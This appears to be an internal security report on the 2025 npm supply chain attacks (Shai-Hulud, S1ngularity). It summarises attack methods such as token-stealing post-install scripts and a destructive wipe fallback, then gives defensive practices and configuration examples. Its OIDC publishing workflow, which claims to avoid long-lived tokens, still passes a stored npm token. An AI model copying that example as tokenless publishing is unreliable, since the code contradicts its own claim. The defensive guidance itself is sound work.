2025 has seen unprecedented supply chain attacks against the npm ecosystem. The Shai-Hulud worm and S1ngularity attacks compromised packages with billions of weekly downloads, exposing the critical importance of supply chain security.

### Major 2025 Supply Chain Attacks

#### Shai-Hulud Worm (September 2025)

**Timeline:** September 8-14, 2025

**Impact:**
- 18 widely-used npm packages compromised
- Over 2.6 billion weekly downloads affected
- Self-replicating worm that spread via npm tokens

**Attack Method:**
1. Phishing email compromised maintainer accounts
2. Malicious releases published to popular packages (chalk, debug, ansi-styles)
3. Post-install scripts stole npm tokens
4. Worm used stolen tokens to compromise more packages

**Capabilities:**
- Stole npm publishing tokens
- Exfiltrated SSH keys, environment variables, crypto wallets
- Self-replicated to other packages
- Created endless stream of potential attacks

#### S1ngularity (August 2025)

**Timeline:** August 26, 2025

**Impact:**
- Nx packages compromised
- Tens of thousands of files exposed
- Over 2,000 distinct secrets stolen

**Attack Method:**
1. Exploited vulnerable GitHub Actions workflow
2. Stole npm publishing token
3. Published malicious versions of Nx packages
4. Post-install script (telemetry.js) scanned for credentials

**Data Stolen:**
- Developer credentials
- SSH keys
- Crypto-wallet files
- Environment variables
- Secrets from CI/CD pipelines

#### Shai-Hulud 2.0 (November 2025)

**Timeline:** Early November 2025 (ongoing)

**Scope:**
- 25,000+ malicious repositories
- 350+ unique GitHub users
- Popular projects affected: Zapier, ENS Domains, PostHog, Postman
- Present in ~27% of cloud and code environments scanned

**New Tactics:**
- Destructive fallback: If credential theft fails, destroys victim's entire home directory
- Securely overwrites and deletes every writable file
- Shifts from pure theft to punitive sabotage

### Industry Response

**GitHub Actions:**
- Immediate removal of 500+ compromised packages
- npm blocking uploads containing malware IoCs
- Enhanced monitoring and detection

**npm Security Improvements:**
- Trusted publishing added (July 2025)
- Provenance attestations
- Enhanced 2FA requirements
- Legacy token sunset (end of 2025)

**CISA Recommendations:**
- Pin npm package dependency versions
- Immediately rotate all developer credentials
- Mandate phishing-resistant MFA
- Implement package allowlists

### Supply Chain Security Best Practices

#### 1. Dependency Pinning

**Lock file discipline:**
```json
// package.json - Use exact versions for critical dependencies
{
  "dependencies": {
    "critical-package": "3.2.1", // Exact version
    "stable-package": "~2.1.0", // Patch updates only
    "flexible-package": "^1.0.0" // Minor updates allowed
  }
}
```

**Lock file integrity:**
- Commit `package-lock.json` to version control
- Use `npm ci` in production/CI (enforces lockfile)
- Review lockfile changes in PRs
- Never ignore lockfile conflicts

**Why it matters:** Red Hat's primary defense against 2025 attacks was "broad usage of version pinning."

#### 2. Multi-Factor Authentication

**Critical requirement:**

Enable phishing-resistant MFA on:
- npm accounts (especially package publishers)
- GitHub accounts
- All developer accounts
- CI/CD service accounts

**Best practices:**
- Use hardware security keys (YubiKey, etc.)
- Avoid SMS-based 2FA (vulnerable to SIM swapping)
- Enable "auth-and-writes" mode for npm 2FA

```bash
# Enable 2FA for publishing
npm profile enable-2fa auth-and-writes
```

#### 3. Trusted Publishing (2025)

**Use OpenID Connect for publishing:**

```yaml
# .github/workflows/publish.yml
name: Publish to npm
on:
  release:
    types: [created]

jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write # Required for OIDC
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20.x'
          registry-url: 'https://registry.npmjs.org'
      - run: npm ci
      - run: npm publish --provenance --access public
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
```

**Benefits:**
- Short-lived, workflow-specific credentials
- No long-lived tokens in secrets
- Automated provenance attestations

#### 4. Package Verification

**Before installing any package:**

```bash
# Check package information
npm view package-name

# Check weekly downloads
npm view package-name dist.downloads

# Check repository
npm view package-name repository.url

# View maintainers
npm view package-name maintainers

# Check for provenance
npm view package-name dist.attestations
```

**Red flags:**
- Newly created packages with no history
- Typosquatting names (e.g., "react-dom" vs "react-domm")
- No repository link
- Suspicious maintainers
- Very low download counts for claimed functionality

#### 5. Automated Security Scanning

**GitHub Advanced Security:**
```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]

jobs:
  dependency-review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/dependency-review-action@v3
        with:
          fail-on-severity: high
```

**Socket.dev integration:**
```yaml
# .github/workflows/socket.yml
name: Socket Security
on: [pull_request]

jobs:
  socket-security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: socketdev/socket-security-action@v1
        with:
          token: ${{ secrets.SOCKET_TOKEN }}
```

**Snyk integration:**
```bash
# Install Snyk CLI
npm install -g snyk

# Authenticate
snyk auth

# Test for vulnerabilities
snyk test

# Monitor project
snyk monitor
```

#### 6. Install Script Protection

**Critical defense:**

```bash
# Globally disable install scripts
npm config set ignore-scripts true

# Or in .npmrc
echo "ignore-scripts=true" >> .npmrc
```

**For legitimate scripts:**
```bash
# Install @lavamoat/allow-scripts
npm install --save-dev @lavamoat/allow-scripts

# Generate allowlist
npx allow-scripts auto
```

**package.json configuration:**
```json
{
  "scripts": {
    "preinstall": "npx allow-scripts"
  },
  "lavamoat": {
    "allowScripts": {
      "trusted-package": true,
      "another-trusted": true
    }
  }
}
```

**Why it matters:** Shai-Hulud, S1ngularity, and Shai-Hulud 2.0 all used post-install scripts for malicious execution.

#### 7. Software Bill of Materials (SBOM)

**Generate SBOM for visibility:**

```bash
# Using npm built-in
npm sbom --format=cyclonedx > sbom.json

# Using CycloneDX tool
npx @cyclonedx/cyclonedx-npm --output-file sbom.json

# Using Syft (multi-language)
syft dir:. -o cyclonedx-json > sbom.json
```

**SBOM management:**
```bash
# Track with OWASP Dependency-Track
# Upload SBOM to central repository
# Monitor for CVEs affecting components
# Automated alerts for new vulnerabilities
```

**Why it matters:** SBOMs provide comprehensive inventory of dependencies for compliance, security monitoring, and incident response.

#### 8. Private Registry / Proxy

**Use Verdaccio or similar:**

```bash
# Install Verdaccio
npm install -g verdaccio

# Run
verdaccio
```

**Configure npm:**
```bash
# .npmrc
registry=http://localhost:4873/
```

**Benefits:**
- Cache packages locally
- Control which packages can be installed
- Scan packages before availability
- Protect against registry downtime
- Audit all package downloads

#### 9. Dependency Allowlisting

**Limit allowed packages:**

```javascript
// scripts/check-dependencies.js
import { readFileSync } from 'fs';

const allowedPackages = new Set([
  'react',
  'react-dom',
  'astro',
  // ... approved packages
]);

const packageJson = JSON.parse(readFileSync('package.json', 'utf-8'));
const allDeps = {
  ...packageJson.dependencies,
  ...packageJson.devDependencies
};

for (const pkg of Object.keys(allDeps)) {
  if (!allowedPackages.has(pkg)) {
    console.error(`Unapproved package: ${pkg}`);
    process.exit(1);
  }
}
```

**Pre-commit hook:**
```bash
#!/bin/bash
# .git/hooks/pre-commit

node scripts/check-dependencies.js
```

#### 10. Credential Rotation

**After 2025 attacks:**

Immediately rotate:
- npm tokens
- GitHub personal access tokens
- SSH keys
- Environment variables in CI/CD
- API keys and secrets
- Database credentials

**Best practices:**
- Use secret management tools (HashiCorp Vault, AWS Secrets Manager)
- Implement automatic rotation
- Audit secret access
- Use short-lived credentials

#### 11. Monitor for Compromise

**Indicators of compromise:**

```bash
# Check for unexpected package-lock.json changes
git diff HEAD -- package-lock.json

# Verify package integrity
npm audit

# Check installed scripts
npm explore package-name -- ls -la

# Review recent commits for suspicious changes
git log --all --oneline -- package.json package-lock.json
```

**Automated monitoring:**
```yaml
# .github/workflows/monitor.yml
name: Dependency Monitor
on:
  schedule:
    - cron: '0 */6 * * *' # Every 6 hours

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm audit --audit-level=high
```

#### 12. Code Review for Dependencies

**Review before merging:**
- Check what changed in `package-lock.json`
- Understand why new dependencies were added
- Verify new dependencies are legitimate
- Check for suspicious version bumps
- Review transitive dependency changes

```bash
# Helpful commands for reviewing dependency changes
npm ls package-name
npm why package-name
npm outdated
```

### Supply Chain Security Checklist

- [ ] Enable phishing-resistant MFA on all accounts
- [ ] Use `npm ci` in production and CI/CD
- [ ] Commit and review package-lock.json changes
- [ ] Configure `ignore-scripts=true` globally
- [ ] Use allowlist for legitimate install scripts
- [ ] Implement trusted publishing with OIDC
- [ ] Generate and monitor SBOM
- [ ] Enable automated security scanning (Dependabot, Snyk, Socket)
- [ ] Verify package legitimacy before installation
- [ ] Use exact version pinning for critical dependencies
- [ ] Implement private registry/proxy
- [ ] Rotate credentials regularly
- [ ] Monitor for indicators of compromise
- [ ] Review dependency changes in PRs
- [ ] Use granular npm access tokens
- [ ] Enable package provenance verification
- [ ] Subscribe to security advisories
- [ ] Implement dependency allowlisting
- [ ] Use minimal permissions for CI/CD
- [ ] Regularly audit installed packages

---

## 8. Additional Security Recommendations

### Subresource Integrity (SRI)

For third-party CDN resources:

```html
<script
  src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js"
  integrity="sha384-KyZXEAg3QhqLMpG8r+Knujsl5+z0CRnU6y0z3VqW6x1OPoFa9J9z9G9v3k8ePqSd"
  crossorigin="anonymous">
</script>

<link
  rel="stylesheet"
  href="https://cdn.example.com/style.css"
  integrity="sha384-abc123..."
  crossorigin="anonymous">
```

**Generate SRI hash:**
```bash
curl -s https://cdn.example.com/library.js | openssl dgst -sha384 -binary | openssl base64 -A
```

**PCI DSS 4.0 Compliance:** Requirement 6.4.3 mandates integrity checks on payment page scripts.

### HTTP Security Headers

Configure at CDN/hosting level:

```
# Security headers for static sites
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

### Secrets Management

**Never commit secrets:**

```bash
# .gitignore
.env
.env.local
.env.*.local
*.key
*.pem
secrets.json
credentials.json
```

**Use environment variables:**
```javascript
// ❌ NEVER do this
const apiKey = "sk_live_abc123...";

// ✅ Use environment variables
const apiKey = process.env.API_KEY;

// Validate at startup
if (!apiKey) {
  throw new Error('API_KEY environment variable required');
}
```

**For build-time secrets:**
```bash
# Use build variables, not committed files
VITE_PUBLIC_KEY=xyz npm run build
```

### HTTPS Enforcement

For static sites:
- Enable HTTPS at CDN/hosting level
- Configure automatic HTTP to HTTPS redirects
- Use HSTS header to enforce HTTPS in browsers
- Consider HSTS preloading for high-security sites

### Regular Security Audits

**Schedule periodic reviews:**
- Monthly: Run `npm audit` and review results
- Quarterly: Update dependencies and re-audit
- Bi-annually: Full security review including SBOM generation
- Annually: Penetration testing and security assessment

**Automated reminders:**
```yaml
# .github/workflows/schedule-audit.yml
name: Monthly Security Audit
on:
  schedule:
    - cron: '0 9 1 * *' # 9 AM on 1st of month
  workflow_dispatch:

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm audit
      - run: npm outdated
      - run: npx @cyclonedx/cyclonedx-npm --output-file sbom-$(date +%Y-%m).json
```

---

## 9. Incident Response

### Detecting Compromise

**Signs your project may be compromised:**
- Unexpected changes to package-lock.json
- New dependencies you didn't add
- Modified build scripts
- Unfamiliar npm scripts in package.json
- Suspicious network requests during builds
- Altered output files
- Increased build times

### Response Procedure

**If compromise is suspected:**

1. **Immediately stop deployments**
2. **Rotate all credentials** (npm tokens, API keys, GitHub tokens)
3. **Review recent commits** for unauthorized changes
4. **Audit all dependencies** using multiple tools
5. **Check for data exfiltration** in logs
6. **Regenerate lockfile** from clean state
7. **Notify affected parties** if data was exposed
8. **Document incident** for post-mortem
9. **Implement additional safeguards** to prevent recurrence

### Lessons from 2025 Attacks

The 2025 supply chain attacks teach us:

1. **No package is too popular to be compromised** - chalk, debug, and ansi-styles were targeted
2. **Phishing works** - Even experienced maintainers can be fooled
3. **Tokens are valuable** - npm tokens are primary attack targets
4. **Install scripts are dangerous** - They execute with full permissions
5. **Detection is difficult** - Malware can remain undetected for days
6. **Impact is widespread** - 2.6 billion downloads affected in a single attack
7. **Defense requires layers** - No single measure prevents all attacks

---

## 10. Conclusion

Static site security requires vigilance across multiple domains:

1. **Dependencies** - Regular audits, version pinning, and comprehensive scanning
2. **Build Scripts** - Input validation, avoiding dangerous APIs, and least privilege
3. **Content Security** - Strong CSP, XSS prevention, and secure Markdown rendering
4. **Supply Chain** - MFA, trusted publishing, install script protection, and monitoring

The 2025 supply chain attacks demonstrate that complacency is dangerous. Even the most popular packages can be compromised. Security must be:

- **Proactive** - Don't wait for incidents
- **Layered** - Multiple overlapping defenses
- **Continuous** - Regular monitoring and updates
- **Team-wide** - Security is everyone's responsibility

By implementing the practices outlined in this report, teams can significantly reduce their attack surface and build more resilient static sites and frontend applications.

---

## Sources

### Dependency Security
- [NPM Security best practices - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/NPM_Security_Cheat_Sheet.html)
- [npm audit fix - Taking Node.js Security to the Next Level | Jit](https://www.jit.io/resources/appsec-tools/npm-audit-fix-taking-nodejs-security-to-the-next-level)
- [Auditing package dependencies for security vulnerabilities | npm Docs](https://docs.npmjs.com/auditing-package-dependencies-for-security-vulnerabilities/)
- [npm-audit | npm Docs](https://docs.npmjs.com/cli/v8/commands/npm-audit/)
- [GitHub - bodadotsh/npm-security-best-practices](https://github.com/bodadotsh/npm-security-best-practices)
- [NPM Security Audit: The Missing Layer Your Team Still Need](https://www.aikido.dev/blog/npm-audit-guide)

### execSync/child_process Security
- [Node.js — Wednesday, April 10, 2024 Security Releases](https://nodejs.org/en/blog/vulnerability/april-2024-security-releases-2)
- [OS Command Injection in NodeJS | SecureFlag](https://knowledge-base.secureflag.com/vulnerabilities/code_injection/os_command_injection_nodejs.html)
- [Preventing Command Injection Attacks in Node.js Apps](https://auth0.com/blog/preventing-command-injection-attacks-in-node-js-apps/)

### Input Validation
- [Input Validation for Web Forms & Website Security](https://blog.sucuri.net/2024/07/input-validation-for-website-security.html)
- [10 Secure Coding Best Practices for Developers [2024]](https://daily.dev/blog/10-secure-coding-best-practices-for-developers-2024)
- [Input Validation - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
- [5 JavaScript Security Best Practices for 2024 - The New Stack](https://thenewstack.io/5-javascript-security-best-practices-for-2024/)
- [Input Validation Security Best Practices for Node.js](https://www.nodejs-security.com/blog/input-validation-best-practices-for-nodejs/)

### Content Security Policy
- [Content Security Policy (CSP): Implementation Guide for 2025](https://inventivehq.com/blog/content-security-policy-implementation-guide)
- [Content Security Policy - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [Content Security Policy (CSP) - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)
- [Content Security Policy (CSP) implementation - Security | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Practical_implementation_guides/CSP)

### XSS Prevention
- [What is cross-site scripting (XSS) and how to prevent it? | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting)
- [Cross Site Scripting Prevention - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [XSS Exploitation in 2025: Advanced Techniques, AI Integration, and Evasion Strategies](https://medium.com/@m.habibgpi/xss-exploitation-in-2025-advanced-techniques-ai-integration-and-evasion-strategies-f6fdd484658e)

### Markdown Rendering Security
- [Secure Markdown Rendering in React: Balancing Flexibility and Safety | HackerOne](https://www.hackerone.com/blog/secure-markdown-rendering-react-balancing-flexibility-and-safety)
- [GitHub - cure53/DOMPurify](https://github.com/cure53/DOMPurify)
- [Using Markdown Securely](https://neworbit.co.uk/using-markdown-securely/)

### Supply Chain Security
- [Our plan for a more secure npm supply chain - The GitHub Blog](https://github.blog/security/supply-chain-security/our-plan-for-a-more-secure-npm-supply-chain/)
- [Widespread Supply Chain Compromise Impacting npm Ecosystem | CISA](https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem)
- [Breakdown: Widespread npm Supply Chain Attack](https://www.paloaltonetworks.com/blog/cloud-security/npm-supply-chain-attack/)
- ["Shai-Hulud" Worm Compromises npm Ecosystem in Supply Chain Attack](https://unit42.paloaltonetworks.com/npm-supply-chain-attack/)
- [Ongoing npm Software Supply Chain Attack Exposes New Risks](https://www.sonatype.com/blog/ongoing-npm-software-supply-chain-attack-exposes-new-risks)

### Package Integrity
- [npm - Why did package-lock.json change the integrity hash from sha1 to sha512?](https://stackoverflow.com/questions/47638381/why-did-package-lock-json-change-the-integrity-hash-from-sha1-to-sha512)
- [npm - Why package-lock.json need integrity?](https://stackoverflow.com/questions/79144059/why-package-lock-json-need-integrity)

### Subresource Integrity
- [Subresource Integrity - Security | MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)
- [Subresource Integrity (SRI) | OWASP Foundation](https://owasp.org/www-community/controls/SubresourceIntegrity)
- [What Is Subresource Integrity (SRI) - KeyCDN Support](https://www.keycdn.com/support/subresource-integrity)

### Software Bill of Materials
- [How to generate an SBOM for JavaScript and Node.js applications | Snyk](https://snyk.io/blog/generate-sbom-javascript-node-js-applications/)
- [npm-sbom | npm Docs](https://docs.npmjs.com/cli/v9/commands/npm-sbom/)
- [GitHub - CycloneDX/cyclonedx-node-npm](https://github.com/CycloneDX/cyclonedx-node-npm)

---

**Report Generated:** November 30, 2025
**Author:** Security Research
**Classification:** Internal Documentation
